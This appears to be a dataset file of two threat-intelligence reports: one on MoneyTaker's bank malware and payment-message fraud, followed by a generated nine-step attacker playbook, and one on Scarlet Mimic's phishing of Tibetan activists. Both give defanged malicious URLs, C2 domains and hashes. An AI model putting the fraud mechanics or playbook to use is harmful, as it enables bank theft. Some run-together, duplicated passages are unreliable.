the timertriggers (after the time interval, which is specified in this timer as the interval of the timer operation).17Timer nameFunctionStatus at the time of launchTimer's triggering intervalActivity of the triggered timerInternetTimerTimer activating AtivatTimerenabled10 secondsTriggers the activation timerKeyloggerTimerKeylogger timerdisabled1 millisecondEnviarTimerData export timerdisabled5 minutesAtivatTimerActivation timerdisabled1 millisecondDesativatTimerDeactivation timerdisabled1 millisecondActivates the functions of the keylogger. Described in detail below.Takes screenshots, dumps all the collected data into a file. Will be described belowTriggers the keylogger timer and the data export timer; disables the activation timer (itself)Triggers the keylogger timer, and the data export timer; disables the deactivation timer (itself)• Timers’ names mean that one of them is used to activatenetwork functions (InternetTimer), another one is used to send data (EnviarTimer). However, in fact they perform other activity. Instead of activating the network functions, the «InternetTimer» timer simply activates another timer, and the «EnviarTimer» timer (translated as «sending timer») captures screenshots and uploads the collected data to a file in a temporary directory. This may indicate that the source code of the file, which was originally written for other purposes (including sending network data), was then slightly modified.• After the start, the application executes the TForm1.FormCreate() procedure, where it loads the necessary system dynamic libraries into the address space and looks for the addresses of the functions WinExec, GetAsyncKeyState, GetWindowTextA, GetForegroundWindow KeyloggerTimer in them. When the timer triggers, it intercepts keystrokes. It also extracts the name of the application (the window title) in which the key was pressed and the date / time of pressing. Below is an example of a record of the keylogger log. Bold marked are pressed keys or dialog box titles in which these keys were entered[F2][F9]</textarea><br><br><b><font color = «green»>[ Run - 2:53:54 - 11.11.2017 ] <br></b></font><style>textarea {width:100%; height:7em;}</style><textarea readonly>some _ entered _ word</textarea><br><br><b><font color = «green»>[ OllyDbg - 1.exe - [CPU - main thread, module 1] - 2:54:25 - 11.11.2017 ] <br></b></font><style>textarea {width:100%; height:7em;}</style><textarea readonly>18• The keylogger records the results of the interception to theTForm1.Memo1 object located on the application’s main form. From here data can be obtained for further recording to a file in a temporary directory.• EnviaTimer. Using the API function GetClipboardData () it canintercept the contents of the clipboard• The anti-emulation function is implemented in the timer code to bypass antivirus and automated sample analysis by calling the ValidateName () function. Purportedly, this method of anti-emulation was copied from a public Russian speaking source (the forum url php?p=109096&postcount=63) and was implemented with an error, due to which the functions of taking screenshots and writing data to a file (which is located in code after checking for emulation) may not be executed.•It takes a screenshot of the desktop, compresses it into JPEG and encodes in base64•It creates a file with the name “%Temp%\perflog1.tmp”Example of the contents of the “%Temp%\ perflog1.tmp” file collected by keylogger and screenshotter• Network communications used to send collected data havenot been detected in the analyzed file.1906ATTACK ON AWS CBRIn August 2016 hackers successfully infiltrated the network of a Russian bank. They used an automated system to steal money through the AWS CBR (Automated Work Station Client of the Russian Central Bank), an interbank fund transfer system.Namemain.exe igfxserv.exexml.exeed.exetxt.exeMD5TypeD57608F6DB9045752165EAF93452D57FMain moduleA70F905266F3D57B73B1D8A265286FD5Module used to substitute payment messages92B03E123B2D97B8E8E274224273EC5EModule used to hide fraudulent transfersModule used to work with temporary filesarsm32.exeA70F905266F3D57B73B1D8A265286FD5UltraVNChostsec64.exe92B03E123B2D97B8E8E274224273EC5EVNC clienthostsec32.exeVNC clientempty32.exeA70F905266F3D57B73B1D8A265286FD5VNC client1E4499560CDD2F69ECBED8761CAC7272 8B1B5D1C8430EC16735E5DED94112B18Meterpreter downloaded a modular tool called Moneytaker v5.0 to the server of the AWS CBR. This is the tool which the group has been named after.Its main module is located in the directory “c:\intel\logs\1\mt\bin” and has the name “main.exe” or “igfxserv.exe”. This is a program without network communications and it should run with the main configuration file specified as an argument. It is initialized according to the configuration file, then it checks the presence of the modules specified in the configuration file and backups of certain AWS CBR directories.Further through the report, in the behavior description which depends on the configuration file, the name of the argument will be specified.MAIN MODULE – “MAIN.EXE” OR “IGFXSERV.EXE” The main module is started by passing the main configuration file “c:\intel\logs\1\mt\config\main-config.txt” as an argument. The module logs all events to the “Main-Logfile” file. Upon startup, the module looks for XML, ED and TXT modules specified in the config file as “XmlBin” “EdBin” and “TxtBin”, respectively. They also search for their configuration files, the parameters: “XmlCfg” “EdCfg” and “TxtCfg”. If configuration files of modules do not exist as separate files, their settings are stored together in the “main- config.txt” file.The module reads the “Directory” “Backup” “Recursive” “Action” parameters and uses the WINAPI function called ReadDirectoryChangesW() to monitor the files appearing in the directories specified in the “Directory”.Directory nameDesignation in AWS CBR%АРМ КБР%\exg\chkDecrypted, unpacked and verified electronic messages%АРМ КБР%\exq\cliReceived messages from AWS CBR formed according to the unified formats of electronic messages of the Central Bank of Russia%АРМ КБР%\tmpTemporary filesWhen a new file appears, the corresponding module is started (ED for the “chk” directory, XML for the “cli” directory and TXT for the “tmp” directory) and copied to the directory specified as “Backup”.21AWS CBR operatorED101A legitimate paymentorder issued byAWS CBR operatorXML.EXEsubstitutes originalpayment detailswith fraudulent onesCBR%ARM_CBR%\exg\cli%ARM_CBR%\exg\chkAWS CBRvalidation component (checks the correctness of the payment message)ED.EXErestores original payment detailsAWS CBR operator receives the response as if the payment details were the initial ones, without suspecting the theft.Payment order withthe fraudulent paymentdetails is sent to theCentral Bank of RussiaAUTOMATED REPLACEMENT MODULE – “XML.EXE” The main module starts the “xml.exe” file, passing the name of a new file in the “%АРМ КБР%\exq\cli” directory and the config file.The automated replacement module records detailed logs and writes them to a file specified in the configuration as “Xml-Logfile”Electronic messages generated by the AWS CBR are placed in the “%АРМ КБР%\exq\cli” directory for further processing by the gateway component “Input control”. It is at this point that the module checks the xml file for validity and determines whether the electronic message file is a payment order (the “ED101” type).22For ED101, the module scans for the fields “Purpose”, “Payer”, “PersonalAcc”, “Payee”, “Name”, “Bank BIC”, “CorrespAcc”, “KPP”, “INN”, “SUM”, “AccDocNo”.Then it reads the file with the fraudsters’ payment details - “Xml- Workfile”. The following fields are specified: ”name”, ”id”, ”acc”, “inn”, “kpp”, ”bik”, ”corr”, ”purpose”.If it manages to get all the necessary fields from the payment order and the “Xml-Workfile” file has required details, then the payment order will be modified by substituting original payment details with fraudulent ones. That said, the payment amount does not change, and for each replaced document the attackers have a separate account. The accounts for which the money goes are not repeated.The success of replacement is due to the fact that at this stage the payment order has not yet been signed, which will occur after payment details are replaced.For further operation of another module - ED, after each automated replacement the XML module stores information in the “Xml-Resultfile” file in the following format:# #CONCEALMENT MODULE – ED.EXE The “ed.exe” file is started by the main module passing the name of a new file in the “%АРМ КБР%\exq\chk” directory and the configuration file.• After the payment order is modified, signed and sent, thefollowing activity is performed:•It is transferred to the logical control where the correctness of the electronic payment message is checked, and the compliance of the payment details with reference data is established• The program checks the possibility of payment within theamount of liquid funds in the bank account23• The electronic payment message is accepted for execution; the funds are debited from the payer’s account and credited to the beneficiary’s account• Based on the results of execution, an electronic message ED206 (confirmation of debit) is sent to the address of the issuer.• The message is decrypted, unpacked, passes the verification of the authentication code and security code and is stored in the “%APM KBR%\exq\chk” directory• The main module starts the concealment module passing theincoming electronic message.The ED module checks whether the incoming electronic message is ED206 (debit/credit confirmation following the results of debit transaction) or ED211 (following the results of the day or payment batch).For ED206, the field “CorrAcc” is verified, for ED211 the “PayeePersonalAcc” field is verified. The values of these fields are compared with HackAcc in the “Xml-Resultfile” file (this is the file in which the XML module stores information about replacements).If the values match, then the module restores the original payment details.This means that the payment order is sent and accepted for execution with the fraudulent payment details, and the responses come as if the payment details were the initial ones. This gives cybercriminals extra time to mule funds before the theft is detected.TEMPORARY FILE MODULE – TXT.EXE The main module is also able to start the TXT module by passing the name of the temporary file of the AWS CBR as an argument. However, we have not managed to obtain this module and do not know its function.All MoneyTaker modules do not have information displayed and actively record their activity to log files. There is also the possibility of a test run, which is performed after installation on a computer with AWS CBR. Hackers use it to control the program operation.After this attack, they did not conduct a single new attack on the AWS CBR using this tool.24In November 2017, they again attacked another bank in Russia. Hackers managed to gain access to the servers and workstations of AWS CBR operators, but they were not able to use MoneyTaker malware because the server was in a completely isolated segment.After an unsuccessful attempt to steal money through the system of interbank transfers, they switched their focus to card processing as in the the US based attacks.2507POTENTIAL ATTACKS ON SWIFTThrough analysis of the attackers’ infrastructure, we discovered that they always try to steal internal banking system documentation: administrator guides, internal instructions and regulations, change request forms, transaction logs, etc.We did not find any evidence of successful attacks on SWIFT conducted by this group, nor did we find any connections with already known incidents, for example, in Hong Kong, Ukraine, or Turkey. However, we know that in addition to the abovementioned documents these threat actors search for and copy documents related to SWIFT, which may indicate pending attacks on this system. Now hackers have the following documents at their disposal:•Installation and Administration Guide for SWIFT Alliance Access 7.0• Security Guide for SWIFT Alliance Access 7.0• System Administrator Procedures, for Ocean Systems’ wiretransfer product FedLink• User Procedures Manual, for Ocean Systems’ wire transferproduct FedLinkThe two last mentioned documents are of interest, because they describe how to make transfers through SWIFT using the FedLink system. According to FedLink’s official website, now they have more than 200 customers in the US and Latin America. We assume that banks in Latin America may become the next target of this group.26Figure. Screenshot of the guidelines on card transaction processing via terminalFigure. Fragment on Credit limit increase from the card processing guidelines08ATTACK ON CARD PROCESSINGThe first attack on card processing that we attribute to this group was conducted in May 2016.Having gained access to the bank network, the attackers compromised the workstation of First Data’s STAR network portal operators, making the changes required and withdrawing the money. In January 2017, the attack was repeated in another bank.Focusing on card processing systems enables the attackers to carry out attacks that are easier and safer for ‘money mules’ who provide cash withdrawals. The attackers are in one country, the victim bank is in another and cash is withdrawn by mules in a third locale. This scheme is simple to implement and does not require much investment from attackers. That explains its increased usage by cybercriminal groups such as Moneytaker and Cobalt.The scheme is extremely simple:• After taking control over a bank network, the attackerschecked if they could connect to the card processing system.• They legally opened or bought cards of the bank whose ITsystem they had hacked.• Money mules – criminals who withdraw money from ATMs – with previously activated cards deployed and waited for the operation to begin.• After getting into the card processing system, the attackersremoved or increased cash withdrawal limits for the cards held by the mules.• They removed overdraft limits, which made it possible to gooverdrawn even with debit cards.• Using these cards, the mules withdrew cash from ATMs, oneby one. The average loss caused by one attack was about $500,000 USD.As in the case with the attacks on SWIFT, they gather internal documents from banks in order to get a better understanding of how to handle certain systems.2709USING BANKING TROJANSThrough analysis of the C&C server used to conduct targeted 1f2d223e15c762209), which was downloaded from the server TROJANSThrough analysis of the C&C server used to conduct targeted phishing campaigns, primarily targeting companies in the UK and US. The email messages contained a malicious document, or a phishing link.When the victim opened the attached document, a macro which downloaded Kronos banking Trojan form the URLhxxp://info.docs-sharepoint[.]com/officeup[.]exe.In the investigated case the “203.exe” file was downloaded from the following link:hххp://profile.invoice-sharepoint.com/Emplid/officeup.exe, in the event of opening the file LHarv.xls (de05666412026c6d6c4740b79bc payloads from the following URLs:hxxp://networkupdate[.]online/kbps/upload/c1c06f7d[.]exeSmoke Loaderhxxp://networkupdate[.]online/kbps/upload/1f80ff71[.]exeSmoke Loaderhxxp://networkupdate[.]online/kbps/upload/a8b05325[.]exeScanPOSScanPOS is a unique point-of-sale (PoS) malware. Upon execution, ScanPOS grabs information about the current running processes and collects the user name and privileges on the infected system. That said, it is primarily designed to dump process memory and search for payment card track data. The Trojan checks any collected data using Luhn’s algorithm for validation and then sends it outbound to the C&C server.The C&C address for ScanPOS was hxxp://invoicesharepoint[.]com/ gateway[.]phpRECOMMENDATIONS 1129Run an indicator check-up in the following sectionOperating system security • Prohibit any remote logon to the system (RDP, SMB, RPC) for local administrators. We recommend that you use only Logon type 2 (interactive): url cc787567(v=ws.10).aspx• Configure the following parameter in the registry on all PCsrunning Windows 7 (and up) and all the servers using Windows 2008R2:HKEY _ LOCAL _ MACHINE/SYSTEM/CurrentControlSet/Control/ SecurityProviders/WDigest/UseLogonCredential=0This registry key prohibits storing unencrypted passwords in RAM (which are usually leveraged by Mimikatz)• Prohibit a standard local administrator with an ID=500 (which is vulnerable pass-the-hash attack). Add another administrator and install updates to protect against Pass the hash attacks: url#ID0E3D• Minimize and completely deny granting administratorprivileges for users of local PCs, especially for users who work with external information systems.• Use a different local Administrator account password onevery node, which must not match any domain administration credentials. If this rule is not currently applied – change all the passwords, make them unique, long and complex. Securely manage local Administrator passwords by using specialized tools, such as Microsoft’s Local Administrator Password Solution (LAPS).• Deny granting domain administrator privileges for commonuser accounts. In order to perform domain administrative tasks, create a separate additional domain user account for each administrator, while preventing them from performing daily routine administrator work on their PCs under an account with administrative rights.30•Isolate hosts in the same VLAN, so that one workstation would not be able to gain access to another one on network levels L2/L3, and could access shared network segments (printers, servers, etc.).• Provide timely updates of OS, antivirus software and otherapplications.• Configure the service accounts with the minimum set ofpermissions necessary for them to function properly (with respect to logon type and group membership). Strictly prohibit adding service accounts to the local administrators group unless absolutely necessary.• Use IDS solutions and a sandbox to analyze files. Werecommend that companies apply technology like Group- IB’s TDS Sensor and sandbox, which are able to detect and prevent these types of attacks.Measures to protect interbank transfer system, card processing and ATMs•Isolate hosts of workstations and servers related to the interbank transfer system.• Ensure the integrity of data, system and application software deployed on the infrastructure servers; introduce application whitelisting on workstations.• Ensure monitoring and notifications in case of anomalous time of access to servers and workstations by operators of financial systems.• Ensure monitoring and notifications of changes to overdraftand cash withdrawal limits.31ABOUT GROUP-IBGROUP-IB HELPS MAJOR CORPORATIONS RECOGNIZE AND REACT TO THE MOST SOPHISTICATED CYBER- THREATS.Profound human intelligence and cutting- edge technologyGroup-IB leverages its proprietary high-tech infrastructure to monitor hacker activity and extract unique data. These data is accomplished by profound human intelligence by experts who conduct incident response and monitor the most secretive underground hacker forums.NETWORK INFRASTRUCTURE • HoneyNet and botnet analysis • Hacker community infiltration • Open-source monitoring • Network attack trackers • TDS Sensors • Behavior analysis systemInvestigationsHUMAN INTELLIGENCE • Malware monitoring and research • CERT-GIB request database • Security assessment • Group-IB case studiesGLOBAL DATA EXCHANGE • Computer incident response teams • Domain registrar and hosting providers • Cyber security vendors • Cybersecurity associations & professional organizations• Europol, Interpol and lawenforcement agenciesEUROPOLINTERPOLWORLD and INTERPOL partnerRecommended by theOrganization for Security and Co-operation in Europe (OSCE)Member of the WorldEconomic ForumGroup-IB Threat Intelligence has been recognized by top industryresearcher reportsProducts and services powered by Threat IntelligenceComprehensive ecosystem of threat intelligence and security solutions empowers organizations to identify threats sooner, respond faster, and build more effective defenses against sophisticated cyberattacks.EARLY WARNING SYSTEM • AntipiracyRESPONSE 24/7/365 • Computer EmergencyResponse Team CERT-GIBRESPONSE 24/7/365 • Digital forensics andmalware analysis Incident investigation• • Financial and corporateInvestigation3212INDICATORS ScreenshotterDropper of Keylogger/ ScreenshotterDropper of Keylogger/ igfxserv.exexml.exeed.exe77003E4E6EB091643DFF0C0F967D8C9001DE7D8689E493D67D0F4275 CC189083Main module5F6D1B1728EAE505B23C7FD16E04AD534D44465AFE4C3FD420475CAB2 5B61B02Module which replaces payment data2B365805E50A09B0149FF2E706CB19D7FAC71FC6B1D1273BE8EB3E93875 0C23BModule which replaces / hides fraud transactionstxt.exewas not restoredModule which operates with investigating cybercrime since 2003www.group-ib.com blog.group-ib.cominfo@group-ib.com +44 2036085907twitter.com/groupib_gib linkedin.com/organization/1382013 ","1. Perform initial network compromise of targets using pen testing tools and stolen credentials. 2. Conduct careful reconnaissance of the victim network. 3. Set up infrastructure mimicking the target organization. 4. Install custom malware like MoneyTaker on financial system servers. 5. Modify transaction records and systems to steal money and hide their tracks. 6. Remove malware traces and infrastructure after the theft is complete. 7. Exfiltrate sensitive documents and data about financial systems for future heists. 8. Develop new custom tools as needed to evade detections and expand their capabilities. 9. Repeat the process on new targets in sectors like banking, payment systems, etc. ",valid_21,"['INI', 'compromise', 'targets', 'US', 'pen testing tools', 'ED', 'reconnaissance', 'the victim', 'Set', 'infrastructure', 'Moneytaker', 'Servers', 'id', 'tracks', 'traces', 'the theft', 'documents', 'data', 'financial systems', 'detection', 'banking', 'payment systems']",INI; compromise; targets; US; pen testing tools; ED; reconnaissance; the victim; Set; infrastructure; Moneytaker; Servers; id; tracks; traces; the theft; documents; data; financial systems; detection; banking; payment systems.
"change in tactics, and provide recommendations for targeted users.SearchThe Tibetan community has been the target of malware-enabled espionage campaigns for over a decade. The attackers responsible for these campaigns are relentless in their attempts to compromise networks and harvest sensitive information. These attacks often demonstrate high levels of sophistication in the social engineering used to entice targets to open malicious attachments or links, but are typically not very technically advanced. A common technique is the use of document-based malware. In a recent four-year study on targeted malware attacks against civil society, which included six Tibetan groups, we found that document-based malware was the most common attack vector, accounting in some cases for up to 95 percent of all attacks against speciﬁc Tibetan groups. In this post, we show that servers used as malware C2 infrastructure by Scarlet Mimic are now hosting phishing pages designed to steal Google credentials from Tibetan activists and journalists. This shift in tactics from malware to phishing campaigns suggests that the attackers are adapting to behavioral changes in the Tibetan community. In the following sections, we provide an overview of malware campaigns connected to Scarlet Mimic we observed targeting Tibetan groups from 2013-2014, and analyze how the same infrastructure is now being used to host a wave of phishing attacks. We conclude with discussion of what may have motivated thisRecently, Palo Alto Networks reported on a years-long espionage campaign they call “Scarlet Mimic” that targeted Tibetan and Uyghur groups (as well as government agencies in Russia and India). The Scarlet Mimic campaigns are a typical example of the attacks civil society faces. Carefully crafted email lures are sent to targets carrying exploits that leverage well-known vulnerabilities (e.g., CVE-2012-0158&lt, CVE-2010-3333), which we have seen used in campaigns against Tibetan groups frequently in recent years.This report describes the latest iteration in a long-running espionage campaign against the Tibetan community. We detail how the attackers continuously adapt their campaigns to their targets, shifting tactics from document-based malware to conventional phishing that draws on “inside” knowledge of community activities. This adaptation appears to track changes in security behaviors within the Tibetan community, which has been promoting a move from sharing attachments via e-mail to using cloud-based ﬁle  sharing alternatives such as Google Drive.Shifting Tactics: Tracking changes in years-long espionage campaign against Tibetans March 10, 2016We connect the attack group’s infrastructure and techniques to a group previously identiﬁed by Palo Alto Networks, which they  named Scarlet Mimic. We provide further context on Scarlet Mimic’s targeting and tactics, and the intended victims of their attack campaigns. In addition, while Scarlet Mimic may be conducting malware attacks using other infrastructure, we analyze how the attackers re-purposed a cluster of their malware Command and Control (C2) infrastructure to mount the recent phishing campaign.This move is only the latest development in the ongoing cat and mouse game between attack groups like Scarlet Mimic and the Tibetan community. The speed and ease with which attackers continue to adapt highlights the challenges faced by Tibetans who are trying to remain safe online.The Tibetan community has recognized these patterns and made efforts to change user behaviors to mitigate the attacks. For example, groups have started a digital security training campaign called “Detach from Attachments”, which urges users to avoid sending or opening email attachments, and to use cloud-based storage (e.g., Google Drive) to send ﬁles instead. However, as the  community changes behaviors, so do the attackers.Teaching In the News ContactTagged: Malware, Phishing, Targeted Threats, TibetCategories: Jakub Dalek, John Scott-Railton, Masashi Crete-Nishihata, Reports and Brieﬁngs , Research NewsBy Jakub Dalek, Masashi Crete-Nishihata, and John Scott-RailtonSummaryBackgroundPart 1: Scarlet Mimic Campaigns against TibetansAccording to Palo Alto Networks, Scarlet Mimic has been active for at least four years. The attack group primarily uses well-known vulnerabilities and the “FakeM” malware family ﬁrst reported by  Trend Micro in 2013, which attempts to disguise its malicious trafﬁc  as commonly used protocols.A cluster of Scarlet Mimic attacks used the FakeM Custom SSL variant and were deployed on C2 infrastructure that relied on free domains provided by Securepoint, a German dynamic DNS service. Dynamic DNS services typically allow anyone to make free subdomains from a main domain. In the case of Securepoint, this service allows anyone to make free subdomains from *.firewall-gateway.com, *.my-gateway.org, *.myfirewall.org and others. We speculate that the attackers may have selected this particular service, because the domains have innocuous technical names (e.g, *.firewall-gateway.com) that may escape casual scrutiny. These kinds of domains can change ownership over time and may be shared by many unrelated users, which can also make analysis more challenging.Our analysis of attacks against the Tibetan community reveals a series of campaigns active from 2013 to 2014 using the FakeM Custom SSL variant and dynamic DNS infrastructure that is linked to Scarlet Mimic. These malware samples are described in detail in the Palo Alto Networks Scarlet Mimic report. Through our engagement with the targeted groups, we provide further context that demonstrates the level of social engineering and targeting put into the attacks. Understanding this context provides insights into the attackers’ tactics, including their later pivot to phishing campaigns. Campaign 1 The ﬁrst attack that we connected to Scarlet Mimic was observed in a July 3, 2013 e-mail. The email was sent to the internal  mailing list for a steering committee of a Tibetan NGO, and was highly customized. The message spoofed the e-mail of the NGO’s director, and demonstrated familiarity with the internal workings of the organization. Under the pretext of an updated strategic plan, the e-mail encouraged recipients to open the attached document titled “[Organization Name] Updated Strategic Plan.doc”From: [Redacted] Date: 03 Jul 2013 Subject: Re: [Steering Committee] conclusions to Strategic Plan Review To: [Redacted] Dear Steering Committee Members, Thanks everyone for all of the good suggestions! Here is the Updated Strategic Plan and we’re looking forward to more comments please! C2 server on the domain: news[.]firewall-gateway[.]com. At the time of the attack this domain resolved to the IP address 109[.]169[.]77[.]230, and was hosted on UK-based virtual server provider iomart Campaign 2 We observed the attackers again on March 19, 2014 when they targeted a different Tibetan group. The attack masqueraded as a message from a representative of the Ofﬁce of His Holiness the Dalai Lama (HHDL) in Taiwan and contained an attachment that  referenced an upcoming visit of HHDL to Japan.Similar to the previous attack, the attachment dropped the FakeM Custom SSL variant, and is also referenced in the Palo Alto Networks report. In this case the malware connected to the C2 detail43[.]myfirewall[.]org, which at the time of the attack also resolved to the same IP address as the previous campaign, 109[.]169[.]77[.]230.Another set of attacks spanned from June to July 2014 targeting the same Tibetan group and a number of Tibetan journalists. The Tibetan group received multiple e-mails purportedly from NGOs working on Tibetan issues, while the journalists were enticed by a promise of survey results on Tibetan political attitudes.All of these attacks used the same FakeM Custom SSL variant and connected to the C2 sys[.]firewall-gateway[.]net, which resolved to 95[.]154[.]195[.]159 at the time of the attack and was also hosted on UK server provider iomart. See Figure 1 for an overview of the campaign.Figure 1: Overview of Campaign 2, showing how the same malicious ﬁles are spread using different pretexts.Part 2: Old Infrastructure, New TricksThroughout November 2015 we observed Scarlet Mimic’s C2 infrastructure being repurposed to host phishing attacks against the Tibetan community. The phishing campaign we identiﬁed consisted of targeted emails with email senders and messages that are  relevant to the Tibetan community. The emails appeared to share links to documents or videos on Google Drive or video sharing websites. The Phishing Campaign Using the example of an e-mail sent to Tibetan journalists, we can demonstrate how a typical phishing attack in the campaign works. The e-mail masquerades as sent by a Tibetan activist, describes a video on China and Tibet, and shares a link to what appears to be a video sharing site.From: Dorjee Tenzin <tenzinsft@gmail.com> Date: 22 Nov 2015 Subject: How CHINA takes care of Tibet and Tibetans – video To: [Redacted] This video – How CHINA takes care of Tibet and Tibetans – is short and easy to understand. Must watch. url fact, the link directs the user to a phishing page:url site displays a lookalike to the Google Gmail login page (see Figure 2).Figure 2: Comparison of Google login phishing page (left) and authentic Google login as ofMarch 2016 (right).Interestingly, the login page used by the attackers is slightly outdated. Their version includes both username and password prompts on the same page. Google has been using a two-prompt process for authentication since May 2015If a victim enters their credentials, the data is sent to the attackers via an HTTP POST request that is formatted as: url An example of the data that is sent back to attackers is provided in Figure 3.Figure 3: A sample of the data sent to the attackers. The Email and Password ﬁelds are the most relevant.Decoy ContentOnce a user enters their credentials they are redirected to decoy content. In the example attack against Tibetan journalists, if the victim entered their credentials they were re-directed to the video “How CHINA takes care of Tibet and Tibetans” on the video sharing site referenced in the email (see Figure 4).Figure 4: Screenshot of destination content.The destination content that the user is sent to is determined by a string in the subdirectory of the URL that has various misspellings of “servicelogin”. In the emails we collected, we found three subdirectory variations:url url url speculate that the last part of the URL, “ojkiojr09” in our example URL (url gateway.com/serviclogin/ojkiojr09[.]asp) may be a campaign code, or a way for the attackers to differentiate on their end who is accessing the phished page, and the destination content to which they should be forwarded. We see a similar string in another of the emails that may be used for this purpose: url gateway[.]com/servicelogin/sfwef[.]asp Phishing Campaign TimelineWe have observed the campaign active between at least November 9, 2015 to December 18, 2015. During this period we collected three phishing emails sent to Tibetan journalists and NGOs. Monitoring the URLs that link to the phishing page reveals that the destination content to which the user would be forwarded was changed frequently. These changes suggest that the campaign was active beyond the three emails we collected and the attackers were sending out additional emails with messages linked to the new destination content.Figure 5 provides a timeline for the campaign and shows when emails were received, the original destination content provided, and changes to the destination content over time. On December 18 the servers were up, but no content was being served in reply to logins.Figure 5: Timeline of phishing campaign (see Appendix A for full details).While we only collected three emails during the span of the campaign, changes in the destination content suggest the timing and theme of further phishing attacks. On November 25, 2015 the destination content on URLs 1 and 2 were both changed to climate change-related content.The content redirected from URL 1 was changed to a public Google Drive folder that contained campaign materials on climate change from a Tibetan NGO. The content redirected from URL 2 was changed to a website used to organize the Global Climate March (globalclimatemarch.org), a demonstration to raise climate change awareness.The climate change theme is signiﬁcant. During this period Tibetan organizations were taking part in advocacy to raise awareness  on climate change in Tibetan areas in anticipation of the United Nations Conference on Climate Change held in Paris, France from November 30 to December 12, 2015.See Appendix A for details on each attack and destination content change. Overlap with Scarlet Mimic Similar to the previous FakeM Custom SSL campaigns, the phishing pages used domains provided by Securepoint’s dynamic DNS service:filegoogle[.]firewall-gateway[.]com accountgoogle[.]firewall-gateway[.]com detail43[.]myfirewall[.]orgSimilar to the previous malware campaigns, all three of these domains are also hosted on iomart.We observed the ﬁrst phishing campaign using this infrastructure in early November 2015. During this time, two of the domains  (filegoogle[.]firewall-gateway[.]com, accountgoogle[.]firewall-gateway[.]com) resolved to the IP address 95[.]154[.]195[.]171.We further investigated this IP address through passive DNS data sources in PassiveTotal and found additional domains that match the “firewall-gateway” naming scheme observed in the Scarlet Mimic malware campaigns:accountsgoogle[.]firewall-gateway[.]com accounts-google[.]firewall-gateway[.]com accountsgoogles[.]firewall-gateway[.]com googlefile[.]firewall-gateway[.]net firewallupdate[.]firewall-gateway[.]com firewallupdate[.]firewall-gateway[.]net drivgoogle[.]firewall-gateway[.]comTable 1 shows connections between domains identiﬁed by Palo Alto Networks, domains we see used as C2 servers in the previous malware campaigns, and relations to servers hosting the recent phishing campaigns. The overlap in domains and passive DNS records shows the infrastructure relationships between the previous Scarlet Mimic campaigns and recent phishing campaigns.ASN NameIP AddressDomainCitlab SeenFakeM gateway.comkaspersky.firewall- gateway.netkissecurity.firewall- gateway.comaccountsgoogle.firewall- gateway.comaccountsgoogles.firewall- gateway.netfilegoogle.firewall- gateway.comfirewallupdate.firewall- gateway.netgooglefile.firewall- gateway.netnews.firewall- gateway.comsys.firewall- gateway.comNEWMEDIAEXPRESS-AS-AP NewMedia Express Pte Ltd. Singapore described in the Scarlet Mimic report (labelled “FakeM Custom”). Evidence of Other Campaigns We leveraged patterns in the conﬁguration of the phishing servers to identity additional servers. The IP address  95[.]154[.]195[.]171 that we saw previously was using Microsoft IIS web server version 6 and was conﬁgured to forbid  access to the top level of the URL path. Using the search engine Shodan we scanned all servers on iomart that ran IIS 6 and forbid access to the root url path with the query:port:80 IIS/6.0 forbidden title:Error ""Content-Length: 218"" country:""GB"" org:iomartFor all the matched servers we sent a query to the URL path (/servicelogin/ojkiojr09.asp), which is used to redirect victims to destination content in the phish attacks. The purpose of this query was to to determine if any other servers would forward us to content in the same manner we had observed in the attacks.We found one other IP address (87[.]117[.]229[.]109) on iomart that responded to this query. We observed this server responding with a redirect to an article by Radio Free Asia regarding the arrest of the aunt of Tenzin Delek Rinpoche, a Tibetan monk who recently died while in a Chinese prison.We saw this content active from November 30, 2015 to December 3, 2015, when the forward link stopped working, which may mean that the campaign completed at this time.We used PassiveTotal to identify which domains pointed to both IP addresses from March 2015 to December 2015 and saw an overlap across three domains:sys[.]firewall-gateway[.]net news[.]firewall-gateway[.]com firewallupdate[.]firewall-gateway[.]netThe domain: firewallupdate[.]firewall-gateway[.]net was referenced in the Palo Alto Network report and pointed to both the IPs we identiﬁed at different times (see Figure 6). Figure 6: Domain overlap between two iomart IPs in the phishing infrastructure.Additionally this new IP had two additional domains that were also using the Securepoint dynamic DNS service: updata[.]firewall-gateway[.]com and accounts-google[.]ﬁrewall-gateway[.]com. We saw one of the domains:  detail43[.]myfirewall[.]org used as a C2 server for an attack in the previously described Scarlet Mimic campaign from 2014.Why the Shift to Phishing?When Scarlet Mimic shifted tactics, they failed to properly compartmentalize their phishing and malware operations, relying on known C2 infrastructure for the new phishing campaigns. Although they tried different attack vectors they still fell back on old habits and resources that could be leveraged by analysts. Monitoring the infrastructure enabled us to track the campaigns over time and demonstrates the importance of infrastructure analysis for security researchers.The shift to phishing campaigns is signiﬁcant, as Palo Alto Networks only observed document-based malware attacks. [1] Importantly, Scarlet Mimic may be continuing to conduct as-yet unreported malware campaigns on other infrastructure. There are a number of potential explanations for this change.The phishing campaigns targeted multiple organizations and individuals in the Tibetan community. Many of these groups act asdistributed networks, with staff members and collaborators around the world. The attackers are, therefore, not necessarily targeting compromise of ofﬁce networks, but rather social networks. Credential phishing is a potentially more efﬁcient means of gaining   access to these networks than document-based malware.In addition, the promotion of behavioral changes in the Tibetan community and the use of document-sharing platforms such as Google Docs over email attachments may have put pressure on attackers’ tactics and led them to experiment with simpler, but potentially effective vectors, such as phishing. In other attacks against the Tibetan community over the past year we have also seen malware sent via Google Drive links in targeted emails. The Scarlet Mimic phishing campaigns add further evidence that attackers are attempting to leverage the wide use and trust of Google applications in the Tibetan community.It is also possible that the rising detections by antivirus products of Scarlet Mimic’s preferred malware toolkit play a role. Out of the 74 FakeM sample hashes provided in the Palo Alto Networks Scarlet Mimic report, 61 are available on VirusTotal. When the samples were ﬁrst submitted to VirusTotal some had zero detections and an overall average detection rate of 38 percent. Following  the publication of the Palo Alto Networks report the average detection increased to 54 percent. The current average detection rate is 71 percent, the highest is 80 percent (46 / 57 antivirus scanners), and the lowest is 51 percent (23 / 45 antivirus scanners). These current detection rates may make the malware that the attackers used in past attacks less reliable for successful infection. While the attackers could be pivoting to new, less detectable malware, simple phishing attacks may also involve less effort and achieve higher success against journalists and NGO targets.Finally, we cannot rule out that converting burned or low-utility command and control servers to phishing might also be intentional down-cycling of infrastructure, before it is discarded. Phishing, in other words, may be the last stop before domains and servers that are losing value are ﬁnally given up. ConclusionThe Tibetan community has been targeted by sophisticated, persistent attackers for over a decade. Scarlet Mimic is just one of these attack groups, and over the years they have demonstrated deep familiarity and inside knowledge of the Tibetan groups they target. They have also shown themselves to be adaptable and responsive to changes in the security behaviors of their targets.Their most recent turn to phishing seems to reﬂect this adaptability (although we leave open the possibility that malware attacks are  continuing, using other infrastructure). A number of factors may have 